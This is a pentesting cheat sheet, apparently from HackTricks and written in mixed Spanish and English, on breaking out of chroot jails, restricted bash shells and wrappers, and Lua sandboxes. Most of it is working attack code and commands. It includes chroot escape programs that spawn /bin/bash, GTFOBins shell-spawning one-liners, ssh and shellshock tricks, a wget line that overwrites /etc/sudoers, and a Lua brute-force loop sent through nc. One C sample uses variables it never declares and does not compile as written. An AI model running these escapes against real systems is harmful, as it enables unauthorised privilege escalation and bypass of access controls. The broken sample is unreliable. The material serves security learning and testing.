# Escaping from Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Busca en** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **si puedes ejecutar algún binario con la propiedad "Shell"**

## Chroot Escapes

De [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): El mecanismo chroot **no está diseñado para defenderse** contra la manipulación intencional por parte de **usuarios** **privilegiados** (**root**). En la mayoría de los sistemas, los contextos chroot no se apilan correctamente y los programas chrooted **con suficientes privilegios pueden realizar un segundo chroot para escapar**.\
Normalmente esto significa que para escapar necesitas ser root dentro del chroot.

> [!TIP]
> La **tool** [**chw00t**](https://github.com/earthquake/chw00t) fue creada para abusar de los siguientes escenarios y escapar de `chroot`.

### Root + CWD

> [!WARNING]
> Si eres **root** dentro de un chroot **puedes escapar** creando **otro chroot**. Esto ocurre porque 2 chroots no pueden coexistir (en Linux), así que si creas una carpeta y luego **creas un nuevo chroot** en esa nueva carpeta estando **tú fuera de ella**, ahora estarás **fuera del nuevo chroot** y por lo tanto estarás en el FS.
>
> Esto ocurre porque normalmente chroot NO mueve tu directorio de trabajo al indicado, así que puedes crear un chroot pero estar fuera de él.

Normalmente no encontrarás el binario `chroot` dentro de una chroot jail, pero **podrías compilar, subir y ejecutar** un binario:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Esto es similar al caso anterior, pero en este caso el **atacante almacena un file descriptor al directorio actual** y luego **crea el chroot en una nueva carpeta**. Finalmente, como tiene **acceso** a ese **FD** **fuera** del chroot, accede a él y **escapa**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD can be passed over Unix Domain Sockets, so:
>
> - Create a child process (fork)
> - Create UDS so parent and child can talk
> - Run chroot in child process in a different folder
> - In parent proc, create a FD of a folder that is outside of new child proc chroot
> - Pass to child procc that FD using the UDS
> - Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail

### Root + Mount

> [!WARNING]
>
> - Mounting root device (/) into a directory inside the chroot
> - Chrooting into that directory
>
> This is possible in Linux

### Root + /proc

> [!WARNING]
>
> - Mount procfs into a directory inside the chroot (if it isn't yet)
> - Look for a pid that has a different root/cwd entry, like: /proc/1/root
> - Chroot into that entry

### Root(?) + Fork

> [!WARNING]
>
> - Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
> - From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
> - This children process will find himself outside of the chroot

### ptrace

> [!WARNING]
>
> - Hace tiempo los usuarios podían depurar sus propios procesos desde un proceso de sí mismos... pero esto ya no es posible por defecto
> - De todos modos, si es posible, podrías hacer ptrace sobre un proceso y ejecutar un shellcode dentro de él ([see this example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Get info about the jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modificar PATH

Comprueba si puedes modificar la variable de entorno PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Usando vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers and help viewers

Muchos entornos restringidos todavía dejan disponibles **pagers** o **help viewers**. Suelen ser más rápidos de abusar que intentar reconstruir `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Si `git` está disponible, recuerda que su salida de ayuda normalmente pasa por un pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

Una vez que sepas qué binarios son accesibles, prueba primero los generadores de shell obvios:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Si solo puedes **inyectar argumentos** en un comando permitido (en lugar de ejecutarlo libremente), también revisa **GTFOArgs**.

### Crear script

Comprueba si puedes crear un archivo ejecutable con _/bin/bash_ como contenido
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtener bash desde SSH

Si estás accediendo mediante ssh, a menudo puedes pedirle al servidor que ejecute un **programa diferente** en lugar del restricted login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Si `ssh` es uno de los pocos binarios permitidos localmente, recuerda que también puede abusarse como un **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declarar
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Puedes sobrescribir, por ejemplo, el archivo sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Algunos entornos no te dejan en un `rbash` normal, sino en **wrappers** como `git-shell`, `rssh` o `lshell`:

- `git-shell` solo acepta comandos Git del lado del servidor además de cualquier cosa presente dentro de `~/git-shell-commands/`. Si ese directorio existe, ejecuta `help` para enumerar las acciones personalizadas permitidas. Si puedes **escribir** ahí, cualquier ejecutable dejado en ese directorio se vuelve accesible.
- `rssh` / `lshell` normalmente solo permiten `scp`, `sftp`, `rsync` o operaciones estilo Git. En esos casos, céntrate primero en **file write primitives**: sube `authorized_keys`, un archivo de inicio de shell o un script auxiliar a una ubicación escribible y luego reconecta con `ssh -t ...`.
- Si el wrapper solo filtra la línea de comandos, enumera los binarios alcanzables y luego pivota de nuevo a **GTFOBins / GTFOArgs**.

### Other tricks

Consulta también:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**También podría ser interesante la página:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Trucos sobre escaping from python jails en la siguiente página:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

En esta página puedes encontrar las global functions a las que tienes acceso dentro de lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Algunos trucos para **llamar funciones de una library sin usar puntos**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerar funciones de una library:
```bash
for k,v in pairs(string) do print(k,v) end
```
Ten en cuenta que cada vez que ejecutas la one liner anterior en un **entorno lua diferente**, el orden de las funciones cambia. Por lo tanto, si necesitas ejecutar una función concreta, puedes realizar un brute force attack cargando diferentes entornos lua y llamando a la primera función de la biblioteca:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtener interactive lua shell**: Si estás dentro de un limited lua shell, puedes obtener un nuevo lua shell (y, con suerte, ilimitado) llamando:
```bash
debug.debug()
```
## Referencias

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
